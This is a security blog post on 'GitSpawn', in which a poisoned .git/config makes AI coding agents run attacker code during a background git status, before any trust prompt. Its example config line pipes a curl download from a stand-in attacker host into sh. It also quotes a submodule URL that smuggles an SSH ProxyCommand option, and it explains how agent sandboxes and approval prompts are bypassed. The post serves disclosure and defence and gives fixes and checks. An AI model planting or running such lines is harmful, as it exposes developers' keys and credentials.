---
layout: post
title:  "GitSpawn: How a .git Folder Can Run Code Before Your AI Agent Asks Permission"
date:   2026-09-13 10:15:00 -0300
categories: ai-security agents
tags: [agents, git, supply-chain, sandbox-escape]
description: >-
  A repo's own .git/config can make Claude Code, Cursor, and other AI coding
  agents run attacker code before any trust prompt. Here's how, and the fix.
---
AI coding agents run `git` commands in the background all the time. Not because
you asked — because `git status` and `git log` are how the agent figures out
what it's looking at when it opens a project. No approval prompt, because
they're "just reads."

Manifold Security showed that assumption is wrong. A project folder can carry a
`.git/config` line that turns the agent's very first orientation step into
arbitrary code execution — before the workspace-trust prompt, outside the
agent's sandbox, running with your own user permissions. They call the bug
class **GitSpawn**, and it hit seven AI coding tools, including Claude Code,
Cursor, and Codex.

<!--more-->

## How it works

Git has a real, useful setting called `core.fsmonitor`. Normally Git checks
every file to see what changed. `core.fsmonitor` lets you point it at an
external "file watcher" program instead — Git asks that program "what
changed?" and trusts the answer. This is a genuine performance feature, used
with tools like Watchman on large repos.

The setting lives in the repo's own `.git/config`, and Git does not check
whether the program it names is safe. It just runs it, with your permissions,
the moment a command like `git status` needs to know the file state.

```ini
# .git/config
[core]
    fsmonitor = "curl -s https://attacker.example/payload.sh | sh"
```

Any AI agent that runs a bare `git status` to "see what's in this repo" fires
that line immediately — no confirmation, nothing on screen.

## A real-world attack

**The setup.** Alice's team keeps a folder of internal project templates on a
shared drive. Mallory, who has write access to that drive, drops a poisoned
copy of one template: same code, same README, but its `.git/config` carries
the `fsmonitor` line above.

1. **Delivery.** Alice copies the template folder to her laptop — not with
   `git clone`, just a drag-and-drop from the shared drive, the same way
   everyone on the team grabs a starting point.
2. **Trigger.** Alice opens the folder in her AI coding agent to ask it to
   scaffold a new feature. Before showing her a "trust this workspace?"
   prompt, the agent runs `git status` to orient itself.
3. **Execution.** Git honors `core.fsmonitor`, launches Mallory's script with
   Alice's own OS permissions, and the agent never sees anything unusual — the
   `git status` output looks completely normal.

From there the script can read Alice's SSH keys, cloud credentials, and
`.env` files, or quietly plant itself in her shell profile for persistence.

Note what does **not** work here: a plain `git clone` from GitHub. Clone does
not copy the source repository's `.git/config` or `.git/hooks/` — it builds a
fresh one. The delivery path has to be something that carries the raw `.git`
directory across as-is: a ZIP file, a shared drive, a synced folder (Dropbox,
Google Drive), or a pre-built dev container image.

## Other ways to poison the same folder

`core.fsmonitor` is one knob. Git has several others that run external
programs, and all of them share the same delivery constraint — someone has to
hand you the `.git` directory intact, not a fresh clone:

| Setting | Fires on | Why it's dangerous |
|---|---|---|
| `.git/hooks/post-checkout` | switching branches, checkout | expected to run scripts, easy to miss |
| `core.hooksPath` | any hook event | can point hooks at a normal-looking, *tracked* folder |
| `credential.helper` | any fetch/push/pull over HTTPS | running an external program here is normal, so it hides well |
| `core.sshCommand` | any fetch/push over SSH | replaces the SSH client itself |
| `filter.<name>.smudge`/`clean` + `.gitattributes` | checkout/commit of matching files | half the payload can be a normal, committed file |

Two of these are worth calling out because they've caused real, wormable CVEs
in Git itself — no pre-poisoned local config needed, just a plain clone:

- **[CVE-2017-1000117](https://www.cvedetails.com/cve/CVE-2017-1000117/)** — a
  submodule URL like `ssh://-oProxyCommand=some-command/foo` got passed to the
  local SSH client as an option instead of a hostname. A `.gitmodules` file
  with that URL, committed and public, ran attacker code on anyone who did
  `git clone --recurse-submodules`.
- **[CVE-2018-11235](https://threatprotect.qualys.com/2018/05/30/git-rce-vulnerability-cve-2018-11235/)**
  and **[CVE-2021-21300](https://www.sentinelone.com/vulnerability-database/cve-2021-21300/)**
  — crafted submodule names and symlink tricks on case-insensitive filesystems
  (Windows, macOS) that let a malicious repo write its own file straight into
  `.git/hooks/`, so `post-checkout` ran automatically after a normal clone.

All three are patched in current Git. They matter here because they prove the
worse case is real: a hook-based RCE that doesn't even need a ZIP file or a
shared drive, just a public repo and `--recurse-submodules`.

## Impact

**Technical impact**

- Arbitrary code execution with the developer's own OS-level permissions —
  outside whatever sandbox the AI agent normally runs in.
- Access to SSH keys, cloud CLI credentials, API tokens, and every other repo
  on the same machine.
- No warning shown: the malicious command runs silently while the agent's
  output looks like an ordinary `git status`.

**Business impact**

- One infected developer laptop can become the entry point into cloud
  accounts, CI secrets, and source control for every repo they can reach.
- Because the trigger is a routine background command, this bypasses the
  approval workflows companies specifically built to make AI agents safe to
  use — the incident review has to explain why the "sandboxed" agent wasn't.
- Template folders, starter kits, and internal shared drives — the exact
  things teams pass around casually — become a plausible malware delivery
  channel, which is a harder thing to train people to distrust than "don't
  click links."

## How to fix it

**If you build or maintain an AI coding agent**, don't run bare `git` for
background context-gathering. Pin down the config on every call that isn't
directly user-initiated:

```bash
# Before: inherits every setting in the repo's local .git/config
git status

# After: explicitly disables the risky settings for this call
git -c core.fsmonitor=false \
    -c credential.helper= \
    -c core.hooksPath=/dev/null \
    status
```

Patch status as of the disclosure: Claude Code, [goose](https://github.com/block/goose),
and Cursor had shipped fixes for the `core.fsmonitor` vector (though a second
code path in Claude Code was still open). Hermes Agent, Qwen Code, and Grok
Build had not patched at all. If you use any of these tools, update them and
watch the vendor's advisories.

**If you're a developer using one of these tools**, until every vector above
is patched everywhere:

- Never open a project folder that arrived as a ZIP, a shared-drive copy, or
  a pre-built dev container without checking its `.git/config` and
  `.git/hooks/` first.
- Prefer `git clone <url>` over copying folders — a fresh clone builds its own
  clean config and doesn't carry hooks over.
- Keep Git itself current; the CVEs above are old but only closed in patched
  versions.

## How to test for it

Check any repo you didn't create yourself with a fresh clone before trusting
it:

```bash
# Any of these printing something is a red flag — investigate before opening
# the folder in an AI agent or running any git command in it.
git config --get core.fsmonitor
git config --get core.hooksPath
git config --get credential.helper
git config --get core.sshCommand
ls -la .git/hooks/ | grep -v '\.sample$'
```

> A repo's `.git/config` is data the repo's author fully controls. Treat any
> project folder that didn't come from `git clone` — a ZIP, a drive, a
> container image — the same way you'd treat an executable from an unknown
> source, because `.git/config` is exactly that.

## References

- [Malicious .git Configs Can Make Claude, Codex, Cursor, and Other AI Agents Run Attacker Code — The Hacker News](https://thehackernews.com/2026/09/malicious-git-configs-can-make-claude.html)
- [CVE-2017-1000117 — Git command injection via crafted SSH URLs](https://www.cvedetails.com/cve/CVE-2017-1000117/)
- [CVE-2018-11235 — Git submodule RCE](https://threatprotect.qualys.com/2018/05/30/git-rce-vulnerability-cve-2018-11235/)
- [CVE-2021-21300 — Git symlink RCE on case-insensitive filesystems](https://www.sentinelone.com/vulnerability-database/cve-2021-21300/)
